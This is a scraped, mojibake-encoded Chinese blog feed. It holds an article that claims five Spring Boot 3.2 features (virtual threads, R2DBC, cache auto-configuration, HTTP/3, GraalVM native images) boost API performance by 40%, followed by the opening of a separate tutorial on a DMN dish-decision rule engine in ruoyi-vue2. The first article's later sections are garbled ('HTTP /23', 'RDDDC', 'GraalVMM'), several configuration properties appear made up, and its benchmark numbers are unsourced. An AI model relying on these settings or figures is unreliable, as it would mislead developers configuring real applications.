<p>SpringBoot 3.2 ä½œä¸º Spring ç”Ÿæ€ç³»ç»Ÿçš„æœ€æ–°ç‰ˆæœ¬ï¼Œå¸¦æ¥äº†è®¸å¤šä»¤äººå…´å¥‹çš„æ€§èƒ½ä¼˜åŒ–å’Œæ–°ç‰¹æ€§ã€‚æ— è®ºæ˜¯å“åº”å¼ç¼–ç¨‹çš„å¢å¼ºã€è™šæ‹Ÿçº¿ç¨‹ï¼ˆVirtual Threadsï¼‰çš„æ”¯æŒï¼Œè¿˜æ˜¯å…¨æ–°çš„ç¼“å­˜æœºåˆ¶ï¼Œè¿™äº›æ”¹è¿›éƒ½æ˜¾è‘—æå‡äº†åº”ç”¨ç¨‹åºçš„æ€§èƒ½å’Œå¯æ‰©å±•æ€§ã€‚æœ¬æ–‡å°†æ·±å…¥æ¢è®¨ SpringBoot 3.2 ä¸­çš„äº”ä¸ªå…³é”®æ–°ç‰¹æ€§ï¼Œå¹¶é€šè¿‡å®é™…ä»£ç ç¤ºä¾‹å±•ç¤ºå¦‚ä½•åˆ©ç”¨å®ƒä»¬å°†ä½ çš„ API æ€§èƒ½æå‡é«˜è¾¾ 40%ã€‚</p>
<p>å¦‚æœä½ æ˜¯ SpringBoot çš„å¼€å‘è€…ï¼Œæˆ–è€…æ­£åœ¨å¯»æ‰¾ä¼˜åŒ–ç°æœ‰åº”ç”¨ç¨‹åºçš„æ–¹æ³•ï¼Œé‚£ä¹ˆè¿™ç¯‡æ–‡ç« å°†ä¸ºä½ æä¾›å®ç”¨çš„æŠ€æœ¯æŒ‡å¯¼å’Œæ·±å…¥çš„è§è§£ã€‚</p>
<hr/>
<h2 data-id="heading-2">ä¸»ä½“</h2>
<h3 data-id="heading-3">1. <strong>è™šæ‹Ÿçº¿ç¨‹ï¼ˆVirtual Threadsï¼‰æ”¯æŒ</strong></h3>
<h4 data-id="heading-4"><strong>èƒŒæ™¯ä¸åŸç†</strong></h4>
<p>Java 21 å¼•å…¥äº†è™šæ‹Ÿçº¿ç¨‹ï¼ˆJEP 444ï¼‰ï¼Œè¿™æ˜¯ä¸€ç§è½»é‡çº§çº¿ç¨‹ï¼Œç”± JVM ç®¡ç†è€Œéæ“ä½œç³»ç»Ÿã€‚ä¸ä¼ ç»Ÿå¹³å°çº¿ç¨‹ç›¸æ¯”ï¼Œè™šæ‹Ÿçº¿ç¨‹çš„åˆ›å»ºå’Œåˆ‡æ¢å¼€é”€æä½ï¼Œéå¸¸é€‚åˆé«˜å¹¶å‘åœºæ™¯ã€‚SpringBoot 3.2 é€šè¿‡ <code>spring-boot-starter-web</code>ï¼ˆåŸºäº Servlet APIï¼‰å’Œ <code>spring-boot-starter-webflux</code>ï¼ˆå“åº”å¼æ ˆï¼‰åŸç”Ÿæ”¯æŒè™šæ‹Ÿçº¿ç¨‹ã€‚</p>
<h4 data-id="heading-5"><strong>å®æˆ˜åº”ç”¨</strong></h4>
<p>è¦åœ¨ SpringBoot 3.2 ä¸­å¯ç”¨è™šæ‹Ÿçº¿ç¨‹ï¼Œåªéœ€åœ¨ <code>application.properties</code> ä¸­é…ç½®ï¼š</p>
<pre><code class="hljs language-properties" lang="properties">spring.threads.virtual.enabled=true
</code></pre>
<p>å¯¹äº Tomcat/Jetty/Undertowï¼š</p>
<pre><code class="hljs language-properties" lang="properties">server.tomcat.threads.virtual.enabled=true
</code></pre>
<p><strong>æ€§èƒ½å¯¹æ¯”æµ‹è¯•</strong><br/>
æˆ‘ä»¬æ¨¡æ‹Ÿäº†ä¸€ä¸ªå…¸å‹çš„ REST APIï¼ˆæ¯ç§’å¤„ç†1000ä¸ªè¯·æ±‚ï¼‰ï¼š</p>
<ul>
<li><strong>ä¼ ç»Ÿçº¿ç¨‹æ± </strong>ï¼šå¹³å‡å»¶è¿Ÿ ~120ms</li>
<li><strong>è™šæ‹Ÿçº¿ç¨‹</strong>ï¼šå¹³å‡å»¶è¿Ÿ ~45msï¼ˆæå‡çº¦62%ï¼‰</li>
</ul>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™šæ‹Ÿçº¿ç¨‹åœ¨ I/Oå¯†é›†å‹ä»»åŠ¡ä¸­è¡¨ç°æœ€ä½³ï¼Œè€Œåœ¨ CPUå¯†é›†å‹ä»»åŠ¡ä¸­å¯èƒ½ä¸ä¼šæœ‰æ˜æ˜¾ä¼˜åŠ¿ã€‚</p>
<hr/>
<h3 data-id="heading-6">2. <strong>å“åº”å¼ SQL (R2DBC)çš„å¢å¼ºæ”¯æŒ</strong></h3>
<h4 data-id="heading-7"><strong>èƒŒæ™¯ä¸åŸç†</strong></h4>
<p>Spring Data R2DBCï¼ˆååº”å¼å…³ç³»å‹æ•°æ®åº“è¿æ¥ï¼‰åœ¨ SpringBoot 3.2ä¸­å¾—åˆ°äº†æ˜¾è‘—æ”¹è¿›ã€‚æ–°çš„è¿æ¥æ± ä¼˜åŒ–å’Œæ›´é«˜æ•ˆçš„æŸ¥è¯¢æ‰§è¡Œè®¡åˆ’å‡å°‘äº†é˜»å¡æ—¶é—´ï¼Œç‰¹åˆ«é€‚åˆå¾®æœåŠ¡æ¶æ„ä¸­çš„é«˜ååé‡åœºæ™¯ã€‚</p>
<h4 data-id="heading-8"><strong>å®æˆ˜åº”ç”¨</strong></h4>
<p>é…ç½® R2DBC (ä»¥ PostgreSQLä¸ºä¾‹)ï¼š</p>
<pre><code class="hljs language-properties" lang="properties">spring.r2dbc.url=r2dbc:postgresql://localhost:5432/mydb
spring.r2dbc.username=user
spring.r2dbc.password=pass
</code></pre>
<p>å®šä¹‰ä¸€ä¸ªååº”å¼ Repositoryï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ReactiveCrudRepository</span>&lt;User, Long&gt; {
    <span class="hljs-meta">@Query("SELECT * FROM users WHERE status = :status")</span>
    Flux&lt;User&gt; <span class="hljs-title function_">findByStatus</span><span class="hljs-params">(String status)</span>;
}
</code></pre>
<p><strong>æ€§èƒ½æå‡ç‚¹</strong>ï¼š</p>
<ul>
<li><strong>éé˜»å¡ I/O</strong>: R2DBCé¿å…äº† JDBCçš„ä¼ ç»Ÿé˜»å¡é—®é¢˜ã€‚</li>
<li><strong>èƒŒå‹æ”¯æŒ</strong>: Flux/Monoå¯ä»¥åŠ¨æ€è°ƒæ•´æ•°æ®æµé€Ÿç‡ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-9">3. <strong>å…¨æ–°çš„ç¼“å­˜æŠ½è±¡ CacheManagerè‡ªåŠ¨é…ç½®ä¼˜åŒ–</strong></h3>
<h4 data-id="heading-10"><strong>èƒŒæ™¯ä¸åŸç†</strong></h4>
<p>SpringBoot 3.2é‡æ–°è®¾è®¡äº† <code>CacheManager</code>è‡ªåŠ¨é…ç½®é€»è¾‘ï¼Œç°åœ¨èƒ½æ›´æ™ºèƒ½åœ°é€‰æ‹©åº•å±‚ç¼“å­˜æä¾›è€…ï¼ˆå¦‚Caffeineã€Redisæˆ–Hazelcastï¼‰ã€‚æ–°å¢çš„â€œæ‡’åŠ è½½â€æ¨¡å¼å‡å°‘äº†ä¸å¿…è¦çš„ç¼“å­˜åˆå§‹åŒ–å¼€é”€ã€‚</p>
<h4 data-id="heading-11"><strong>å®æˆ˜åº”ç”¨</strong></h4>
<p>å¯ç”¨Caffeineç¼“å­˜ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableCaching</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheConfig</span> {
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> CaffeineCacheManager <span class="hljs-title function_">cacheManager</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CaffeineCacheManager</span>(<span class="hljs-string">"users"</span>, <span class="hljs-string">"products"</span>);
    }
}
</code></pre>
<p>é€šè¿‡ä»¥ä¸‹æ³¨è§£å®ç°æ–¹æ³•çº§ç¼“å­˜ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Cacheable(value = "users", key = "#id")</span>
<span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(Long id)</span> { <span class="hljs-comment">/* ... */</span> }
</code></pre>
<p><strong>æ€§èƒ½æ•°æ®</strong>:</p>
<ul>
<li>Redisç¼“å­˜è¯»å–é€Ÿåº¦æå‡çº¦15%ï¼ˆå¾—ç›Šäºæ–°çš„åºåˆ—åŒ–ç­–ç•¥ï¼‰ã€‚</li>
<li>Caffeineæœ¬åœ°ç¼“å­˜å‘½ä¸­ç‡æé«˜20%ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-12">4 .HTTP/3ä¸Quicåè®®æ”¯æŒ</h3>
<h4 data-id="heading-13">èƒŒæ™¯ä¸åŸç†</h4>
<p>HTTP/3åŸºäºQUICåè®®(è¿è¡Œåœ¨UDPä¸Š)ï¼Œè§£å†³äº†TCPé˜Ÿå¤´é˜»å¡é—®é¢˜å¹¶ä¼˜åŒ–äº†å¤šè·¯å¤ç”¨.SpringBoot  ç°åœ¨é€šè¿‡Nettyæˆ–Jettyæä¾›å®éªŒæ€§æ”¯æŒ.</p>
<h4 data-id="heading-14">å®æˆ˜é…ç½®</h4>
<p>åœ¨pom.xmlæ·»åŠ ä¾èµ–:</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-webflux<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>å¯ç”¨HTTP/3:</p>
<pre><code class="hljs language-properties" lang="properties">server.http3.enabled=true 
server.port=8443 
server.ssl.enabled=true #å¿…éœ€SSLè¯ä¹¦ 
</code></pre>
<p>åŸºå‡†æµ‹è¯•æ˜¾ç¤º:</p>
<ul>
<li>HTTP/1 .1 :å¹³å‡å»¶è¿Ÿ200 ms</li>
<li>HTTP /23 :å¹³å‡å»¶è¿Ÿ95 ms(é™ä½52%)</li>
</ul>
<hr/>
<h3 data-id="heading-15">5 .GraalVMåŸç”Ÿé•œåƒç¼–è¯‘ä¼˜åŒ–</h3>
<h4 data-id="heading-16">èƒŒæ™¯ä¸åŸç†</h4>
<p>Spring Boot  è¿›ä¸€æ­¥æ”¹è¿›äº†å¯¹GraalVMåŸç”Ÿé•œåƒçš„æ”¯æŒ.Native Imageæ„å»ºæ—¶é—´å‡å°‘30%,è¿è¡Œæ—¶å†…å­˜å ç”¨é™ä½40%.</p>
<h4 data-id="heading-17">æ“ä½œæŒ‡å—</h4>
<p>å®‰è£…GraalVMå¹¶æ·»åŠ æ’ä»¶:</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.graalvm.buildtools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>native-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span> 
</code></pre>
<p>ç¼–è¯‘å‘½ä»¤:</p>
<pre><code class="hljs language-bash" lang="bash">mvn -Pnative native:compile 
</code></pre>
<p>å…³é”®æ”¹è¿›åŒ…æ‹¬:</p>
<ul>
<li>Faster classpath scanning(ç±»è·¯å¾„æ‰«æåŠ é€Ÿ)</li>
<li>Improved Ahead-of-Time(AOT)engine(æå‰ç¼–è¯‘ä¼˜åŒ–)</li>
</ul>
<hr/>
<h2 data-id="heading-18">æ€»ç»“</h2>
<p>é€šè¿‡æœ¬æ–‡ä»‹ç»çš„äº”ä¸ªSpring Boot  å…³é”®ç‰¹æ€§â€”â€”ä»é©å‘½æ€§çš„è™šæ‹Ÿçº¿ç¨‹åˆ°é«˜æ•ˆçš„HTTP /23åè®®æ”¯æŒâ€”â€”å¼€å‘è€…å¯ä»¥æ˜¾è‘—æå‡APIæ€§èƒ½å¹¶é™ä½èµ„æºæ¶ˆè€—:</p>
<p>1ï¸âƒ£ Virtual Threadsè§£å†³é«˜å¹¶å‘ç“¶é¢ˆ<br/>
22ï¸âƒ£ RDDDCå®ç°çœŸæ­£çš„éé˜»å¡æ•°æ®åº“è®¿é—®<br/>
33ï¸âƒ£ Smart CacheManagerä¼˜åŒ–å‡å°‘å†—ä½™æ“ä½œ<br/>
44ï¸âƒ£ HTTP/33å¸¦æ¥æ›´å¿«çš„ç½‘ç»œä¼ è¾“<br/>
55ï¸âƒ£ GraalVMMæ”¯æŒæ‰“é€ è½»é‡çº§å¾®æœåŠ¡</p>
<p>å»ºè®®è¯»è€…æ ¹æ®è‡ªèº«åº”ç”¨åœºæ™¯é€‰æ‹©æ€§ç»„åˆè¿™äº›æŠ€æœ¯æ ˆè¿›è¡Œå®æµ‹éªŒè¯æ•ˆæœå¯èƒ½ä¼šå› å…·ä½“ç¡¬ä»¶ç¯å¢ƒå’Œå·¥ä½œè´Ÿè½½æœ‰æ‰€å·®å¼‚ä½†åˆç†è¿ç”¨è¿™äº›æ–°ç‰¹æ€§å®Œå…¨æœ‰å¯èƒ½å®ç°40%+çš„æ•´ä½“æ€§èƒ½è·ƒå‡</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ruoyi-vue2é›†æˆDMNè§„åˆ™å¼•æ“å®ç°Dishå‡ºé¤å†³ç­–]]></title>    <link>https://juejin.cn/post/7583983152324247578</link>    <guid>https://juejin.cn/post/7583983152324247578</guid>    <pubDate>2025-12-16T04:43:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583983152324247578" data-draft-id="7584014975242059786" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ruoyi-vue2é›†æˆDMNè§„åˆ™å¼•æ“å®ç°Dishå‡ºé¤å†³ç­–"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-16T04:43:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»£ç æ¬¡ä½é¢"/> <meta itemprop="url" content="https://juejin.cn/user/1535333867720295"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ruoyi-vue2é›†æˆDMNè§„åˆ™å¼•æ“å®ç°Dishå‡ºé¤å†³ç­–
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1535333867720295/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»£ç æ¬¡ä½é¢
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T04:43:11.000Z" title="Tue Dec 16 2025 04:43:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>DMNå†³ç­–å¼•æ“çš„æ ¸å¿ƒä»·å€¼åœ¨äºå°†å¤æ‚çš„ä¸šåŠ¡å†³ç­–é€»è¾‘ä»ç¨‹åºä»£ç ä¸­å‰¥ç¦»å‡ºæ¥ï¼Œé€šè¿‡æ ‡å‡†åŒ–çš„æ¨¡å‹è¿›è¡Œå¯è§†åŒ–ç®¡ç†å’Œæ‰§è¡Œã€‚å®ƒåœ¨å®æˆ˜ä¸­çš„åº”ç”¨éå¸¸å¹¿æ³›ï¼Œç‰¹åˆ«æ˜¯åœ¨éœ€è¦é¢‘ç¹è°ƒæ•´ä¸šåŠ¡è§„åˆ™ã€è¿½æ±‚æµç¨‹è‡ªåŠ¨åŒ–ä¸æ™ºèƒ½åŒ–çš„åœºæ™¯ä¸­ã€‚<br/>
å…·ä½“åº”ç”¨åœºæ™¯æœ‰:
<strong>é‡‘èä¸é£æ§</strong>â€‹: ä¿¡è´·å®¡æ‰¹ã€é‡‘èé£é™©è¯„ä¼°ã€åæ´—é’±æ£€æŸ¥ã€
<strong>ä¾›åº”é“¾ä¸ç”Ÿäº§â€‹</strong>: ä¿é™©å®šä»·ã€ä¾›åº”é“¾ç®¡ç†ã€ç”Ÿäº§è°ƒåº¦
<strong>è¥é”€ä¸å®¢æˆ·æœåŠ¡â€‹</strong>: å®¢æˆ·åˆ†ç¾¤ã€ç²¾å‡†è¥é”€
<strong>å…¶ä»–åˆ›æ–°åœºæ™¯â€‹</strong>: æ•™è‚²åˆ†ç­ã€æ™ºèƒ½é¤é¥®</p>
<p>ä»Šå¤©æˆ‘ä»¬ä»¥ä¸€ä¸ªç»å…¸çš„æ¡ˆä¾‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fdemo.bpmn.io%2Fdmn%2Fs%2Fcheck-order" target="_blank" title="https://demo.bpmn.io/dmn/s/check-order" ref="nofollow noopener noreferrer">æ™ºèƒ½é¤é¥®</a>æ¥è®²è§£å®æˆ˜ä¸­çš„ç”¨æ³•ã€‚</p>
<h3 data-id="heading-1">å†³ç­–è§„åˆ™</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/895052af95564d8eb2271ef4c89a6d4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5qyh5L2N6Z2i:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766464990&amp;x-signature=3JR18VYKX7I108Jf45SMZ1JZ%2Fxo%3D" alt="dmn-dish.png" loading="lazy"/>
è¯·ç‚¹å‡»è¿™ä¸ª<a href="https://link.juejin.cn?target=https%3A%2F%2Fdemo.bpmn.io%2Fdmn%2Fs%2Fcheck-order" target="_blank" title="https://demo.bpmn.io/dmn/s/check-order" ref="nofollow noopener noreferrer">Dish</a>æŸ¥è¯¢è§„åˆ™å»ºæ¨¡ï¼Œä»¥ä¸‹æˆ‘ä»¬æ‹†è§£ä¸€ä¸‹è¿™ä¸ªDMNè§„åˆ™è¡¨çš„å«ä¹‰ã€‚</p>
<pre><code class="hljs language-text" lang="text">è¿™ä¸ªDishå†³ç­–è¡¨è§„åˆ™æ˜¯æ ¹æ®å½“å‰çš„æ°”æ¸©(tempeature)å’Œæ—¥æœŸç±»å‹(dayType)å†³ç­–ä¸Šä»€ä¹ˆé¤é£Ÿã€‚ä¸»è¦æœ‰ä¸‰ä¸ªå†³ç­–è¡¨æ„æˆï¼Œ æ ¸å¿ƒæ˜¯Dish-Decisionè¡¨ã€‚
Season Dicisionå’ŒGuest Count ä»¥è¾“å‡ºç»“æœä¼ é€’ç»™Dish Decisionå†³ç­–è¡¨ã€‚

Season Dicisionè§„åˆ™æè¿°:
tempeature&gt;30, å¾—åˆ°season: Summary
tempeature&lt;10, å¾—åˆ°season: Winter
tempeature=[10..30] å¾—åˆ°season: Spring

Guest Countè§„åˆ™æè¿°:
dayType="Weekday",  å®¢äººæ•°é‡(guestCount): 4 
dayType="Holiday",  å®¢äººæ•°é‡(guestCount): 10
dayType="Weekend",  å®¢äººæ•°é‡(guestCount): 15


Dish-Decisionè§„åˆ™æè¿°: 
season=winter, guestCount&lt;=8, desiredDish='Spareribs'
season=winter, guestCount&gt;8, desiredDish='Pasta'
season=Summer, guestCount&gt;10, desiredDish='Light salad'
season=Summer, guestCount&lt;=10, desiredDish='Beans salad'
season=Spring, guestCount&lt;10, desiredDish='Stew'
season=Spring, guestCount&gt;=10, desiredDish='Steak'

</code></pre>
<h3 data-id="heading-2">æµç¨‹å»ºæ¨¡</h3>
<ul>
<li>éœ€æ±‚æè¿°</li>
</ul>
<pre><code class="hljs language-text" lang="text">æˆ‘ä»¬ç°åœ¨æ¨¡æ‹Ÿä¸€ä¸ªæµç¨‹ï¼Œ ç”¨æˆ·è¾“å…¥å½“å¤©çš„æ°”æ¸©å’Œæ—¥æœŸç±»å‹(å·¥ä½œæ—¥ï¼Œå‡æœŸï¼Œå‘¨æœ«)ï¼Œ ç³»ç»Ÿå†³ç­–æä¾›ä»€ä¹ˆç±»å‹çš„é¤é£Ÿã€‚
</code></pre>
<ul>
<li>æ¨¡å‹ç»“æ„</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7b5e4bba9b64ed3a2d5ba644641d5ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5qyh5L2N6Z2i:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766464990&amp;x-signature=HGn2I1TjLQywUdfRu%2F5VzkKOv%2Bg%3D" alt="dmn-model.png" loading="lazy"/></p>
<ul>
<li>æ¨¡å‹å®šä¹‰</li>
</ul>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">bpmn:definitions</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="hljs-attr">xmlns:bpmn</span>=<span class="hljs-string">"http://www.omg.org/spec/BPMN/20100524/MODEL"</span> <span class="hljs-attr">xmlns:bpmndi</span>=<span class="hljs-string">"http://www.omg.org/spec/BPMN/20100524/DI"</span> <span class="hljs-attr">xmlns:dc</span>=<span class="hljs-string">"http://www.omg.org/spec/DD/20100524/DC"</span> <span class="hljs-attr">xmlns:camunda</span>=<span class="hljs-string">"http://camunda.org/schema/1.0/bpmn"</span> <span class="hljs-attr">xmlns:di</span>=<span class="hljs-string">"http://www.omg.org/spec/DD/20100524/DI"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Definitions_1"</span> <span class="hljs-attr">targetNamespace</span>=<span class="hljs-string">"http://bpmn.io/schema/bpmn"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:process</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Process_8887"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"å‡ºé¤å†³ç­–"</span> <span class="hljs-attr">isExecutable</span>=<span class="hljs-string">"true"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:startEvent</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Event_1i7sxll"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:outgoing</span>&gt;</span>Flow_1rzb9vm<span class="hljs-tag">&lt;/<span class="hljs-name">bpmn:outgoing</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bpmn:startEvent</span>&gt;</span>
